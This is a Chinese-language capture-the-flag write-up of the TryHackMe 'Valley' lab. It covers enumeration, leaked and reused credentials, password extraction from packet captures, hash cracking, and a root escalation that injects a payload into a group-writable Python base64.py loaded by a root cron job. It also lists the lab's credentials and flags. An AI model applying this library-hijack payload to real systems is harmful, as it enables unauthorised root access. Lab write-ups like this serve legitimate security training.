# THM Valley 靶场完整渗透测试 Writeup

**靶场**: TryHackMe - Valley  
**目标 IP**: 10.48.171.253  
**难度**: Medium  
**完成日期**: 2026-05-19  
**测试人员**: pentest-main / yao  

---

## 目录
1. [信息收集](#1-信息收集)
2. [Web 枚举与隐藏目录发现](#2-web-枚举与隐藏目录发现)
3. [凭证发现链](#3-凭证发现链)
4. [FTP 渗透与抓包分析](#4-ftp-渗透与抓包分析)
5. [SSH 获取与用户 Flag](#5-ssh-获取与用户-flag)
6. [valleyAuthenticator 逆向分析](#6-valleyauthenticator-逆向分析)
7. [valley 用户登录与提权](#7-valley-用户登录与提权)
8. [Python 库劫持提权](#8-python-库劫持提权)
9. [Root Flag 获取](#9-root-flag-获取)
10. [完整攻击链总结](#10-完整攻击链总结)
11. [修复建议](#11-修复建议)

---

## 1. 信息收集

### 1.1 Nmap 端口扫描

```bash
nmap -sV -sC --top-ports 1000 10.48.171.253
```

| 端口      | 状态 | 服务 | 版本                            |
| --------- | ---- | ---- | ------------------------------- |
| 22/tcp    | open | SSH  | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 |
| 80/tcp    | open | HTTP | Apache httpd 2.4.41 (Ubuntu)    |
| 37370/tcp | open | FTP  | vsftpd 3.0.3                    |

**关键发现**: FTP 服务运行在 **非标准端口 37370**，这是常见的隐藏服务策略。

### 1.2 Web 服务探测

```bash
curl -sk http://10.48.171.253/
```

返回 **Valley Photo Co.** 摄影公司展示网站，纯静态 HTML 页面。

---

## 2. Web 枚举与隐藏目录发现

### 2.1 目录扫描

使用 Gobuster 扫描网站目录：

```bash
gobuster dir -u http://10.48.171.253 -w /usr/share/wordlists/dirb/common.txt -t 50
```

**发现目录**:
- `/gallery/` - 图片画廊
- `/pricing/` - 定价页面
- `/static/` - 静态资源目录

### 2.2 /static/ 目录深入扫描

```bash
gobuster dir -u http://10.48.171.253/static -w /usr/share/wordlists/dirb/common.txt
```

**重大发现**: `/static/00` 文件存在！

```bash
curl -sk http://10.48.171.253/static/00
```

**内容**:
```
dev notes from valleyDev:
- add wedding photo examples
- redo the editing on #4
- remove /dev1243224123123
- check for SIEM alerts
```

**关键线索**: 开发者笔记泄露了隐藏路径 `/dev1243224123123`

### 2.3 访问隐藏开发目录

```bash
curl -sk http://10.48.171.253/dev1243224123123/
```

发现 **Valley Photo Co. Dev Login** 页面，包含：
- `index.html` - 开发登录页
- `dev.js` - 登录验证脚本 ⚠️
- `button.js` - 按钮功能
- `old.js` - 旧版登录模板

---

## 3. 凭证发现链

### 3.1 第一阶段: dev.js 硬编码凭证

分析 `dev.js`:

```javascript
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

**提取凭证**:
- 用户名: `siemDev`
- 密码: `california`

### 3.2 访问开发笔记

```bash
curl -sk http://10.48.171.253/dev1243224123123/devNotes37370.txt
```

**内容**:
```
dev notes for ftp server:
- stop reusing credentials
- check for any vulnerabilies
- stay up to date on patching
- change ftp port to normal port
```

**关键线索**: "stop reusing credentials" 暗示 FTP 凭证与 Web 开发凭证相同！

---

## 4. FTP 渗透与抓包分析

### 4.1 FTP 登录

使用 siemDev/california 登录 FTP（端口 37370）：

```bash
ftp -p -n 10.48.171.253 37370
user siemDev california
```

**登录成功** ✅

### 4.2 FTP 目录内容

```
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
```

**发现**: 3 个 Wireshark 抓包文件

### 4.3 下载并分析抓包文件

```bash
ftp> get siemHTTP2.pcapng
```

使用 tshark 分析 HTTP 流量：

```bash
tshark -r siemHTTP2.pcapng -Y "http.request.method == \"POST\" && ip.dst == 192.168.111.136" -T fields -e http.file_data
```

**发现 HTTP POST 数据**:
```
756e616d653d76616c6c6579446576267073773d706830743073313233342672656d656d6265723d6f6e
```

十六进制解码：
```bash
echo "756e616d653d76616c6c6579446576267073773d706830743073313233342672656d656d6265723d6f6e" | xxd -r -p
```

**结果**:
```
uname=valleyDev&psw=ph0t0s1234&remember=on
```

**提取 SSH 凭证**:
- 用户名: `valleyDev`
- 密码: `ph0t0s1234`

---

## 5. SSH 获取与 User Flag

### 5.1 SSH 登录

```bash
ssh valleyDev@10.48.171.253
# 密码: ph0t0s1234
```

**登录成功** ✅

### 5.2 系统枚举

```bash
id
# uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)

uname -a
# Linux valley 5.4.0-139-generic #156-Ubuntu SMP

cat /etc/os-release
# Ubuntu 20.04.6 LTS (Focal Fossa)
```

### 5.3 获取 User Flag

```bash
cat ~/user.txt
```

**User Flag**: `THM{k@l1_1n_th3_v@lley}`

---

## 6. valleyAuthenticator 逆向分析

### 6.1 发现程序

在 `/home/` 目录发现异常文件：

```bash
ls -la /home/
# -rwxrwxr-x 1 valley valley 749128 Aug 14 2022 valleyAuthenticator
```

### 6.2 UPX 脱壳

```bash
upx -d valleyAuthenticator -o valleyAuthenticator_unpacked
```

**结果**:
```
2290962 <- 749128   32.70%   linux/amd64   valleyAuthenticator_unpacked
```

### 6.3 字符串分析

```bash
strings valleyAuthenticator_unpacked | grep -E "pass|user|flag|root|valley|correct|success|welcome|wrong|authenticat"
```

**发现**:
```
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
```

### 6.4 发现 MD5 Hash

用户通过更精确的 strings 搜索发现：

```bash
strings -n 10 valleyAuthenticator | grep -A 5 -B 5 Authenticator
```

**发现两个 32 位十六进制字符串**:
```
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
```

### 6.5 Hash 破解

使用 hashcat 破解 MD5：

```bash
echo "e6722920bab2326f8217e4bf6b1b58ac" > hashes.txt
echo "dd2921cc76ee3abfd2beb60709056cfb" >> hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**破解结果**:
| Hash                               | 明文           |
| ---------------------------------- | -------------- |
| `dd2921cc76ee3abfd2beb60709056cfb` | **valley**     |
| `e6722920bab2326f8217e4bf6b1b58ac` | **liberty123** |

**推断凭证**:
- 用户名: `valley`
- 密码: `liberty123`

---

## 7. valley 用户登录与提权

### 7.1 SSH 登录 valley

```bash
ssh valley@10.48.171.253
# 密码: liberty123
```

**登录成功** ✅

### 7.2 系统枚举

```bash
id
# uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

**关键发现**: valley 用户属于 **valleyAdmin** 组！

### 7.3 查找 valleyAdmin 权限

```bash
find / -group valleyAdmin -type f 2>/dev/null
```

**重大发现**:
```
/usr/lib/python3.8/base64.py
```

**权限分析**:
```bash
ls -la /usr/lib/python3.8/base64.py
# -rwxrwxr-x 1 root valleyAdmin 20382 Mar 13 2023 /usr/lib/python3.8/base64.py
```

valleyAdmin 组可写！这意味着可以修改 Python 标准库！

### 7.4 计划任务分析

```bash
cat /etc/crontab
```

**关键发现**:
```
1  *  *  *  *   root    python3 /photos/script/photosEncrypt.py
```

**root 每分钟执行 Python 脚本！**

---

## 8. Python 库劫持提权

### 8.1 攻击原理

1. root 每分钟执行 `python3` 脚本
2. Python 会自动加载标准库（包括 `base64.py`）
3. valleyAdmin 组可修改 `/usr/lib/python3.8/base64.py`
4. 在 base64.py 中注入恶意代码
5. root 执行 python3 → 自动运行恶意代码

### 8.2 执行提权

**步骤 1**: 备份原始文件

```bash
cp /usr/lib/python3.8/base64.py /usr/lib/python3.8/base64.py.bak
```

**步骤 2**: 注入 Payload
```bash
cat >> /usr/lib/python3.8/base64.py << "EOF"

import os
if os.getuid() == 0:
    with open("/root/root.txt", "r") as f:
        flag = f.read().strip()
    with open("/tmp/root_flag.txt", "w") as f:
        f.write(flag)
    os.system("chmod 777 /tmp/root_flag.txt")
EOF
```

**步骤 3**: 等待 root cron 执行（最多 1 分钟）
```bash
sleep 65
```

**步骤 4**: 读取 Root Flag
```bash
cat /tmp/root_flag.txt
```

---

## 9. Root Flag 获取

**Root Flag**: `THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}`

**提权成功** ✅

---

## 10. 完整攻击链总结

```
[信息收集]
    Nmap 扫描 → 发现 22/80/37370 端口
         ↓
[Web 枚举]
    Gobuster 扫描 → 发现 /static/00
         ↓
[隐藏目录]
    /static/00 → 泄露 /dev1243224123123
         ↓
[凭证发现 1]
    dev.js → 硬编码 siemDev/california
         ↓
[FTP 渗透]
    FTP 登录 (37370) → 下载 3 个抓包文件
         ↓
[抓包分析]
    tshark 分析 HTTP POST → 提取 valleyDev/ph0t0s1234
         ↓
[SSH 获取]
    SSH 登录 → 获取 User Flag
         ↓
[逆向分析]
    UPX 脱壳 valleyAuthenticator → 发现 MD5 hash
         ↓
[Hash 破解]
    hashcat 破解 → valley/liberty123
         ↓
[valley 用户]
    SSH 登录 valley → 发现 valleyAdmin 组
         ↓
[权限提升]
    valleyAdmin 拥有 base64.py → 修改 Python 标准库
         ↓
[Root 获取]
    root cron 执行 python3 → 触发 payload → 获取 Root Flag
```

---

## 11. 修复建议

### 11.1 立即修复
1. **移除所有硬编码凭证** - 从 dev.js、源代码、配置文件中删除
2. **更改所有密码** - Web/FTP/SSH 账户密码
3. **禁用 FTP 或改为 SFTP** - 避免明文传输
4. **修复文件权限** - `/usr/lib/python3.8/base64.py` 不应属于 valleyAdmin 组
5. **移除计划任务中的 root 执行** - 或改为低权限用户

### 11.2 短期修复
1. 实施 HTTPS 替代 HTTP
2. 使用环境变量或密钥管理服务存储凭证
3. 移除或保护隐藏开发目录
4. 定期审计文件权限

### 11.3 长期修复
1. 实施密码复杂度策略
2. 部署 WAF 和入侵检测系统
3. 定期安全审计和渗透测试
4. 建立安全开发流程（SDLC）

---

## 技术参考

### 使用的工具
- Nmap - 端口扫描
- Gobuster - 目录枚举
- tshark/Wireshark - 流量分析
- hashcat - Hash 破解
- UPX - 脱壳工具
- sshpass - SSH 自动化

### 关键漏洞
- **凭证复用** - 多个服务使用相同凭证
- **硬编码密码** - JavaScript 中明文存储凭证
- **文件权限不当** - 敏感文件权限配置错误
- **Python 库劫持** - 标准库文件可被低权限用户修改
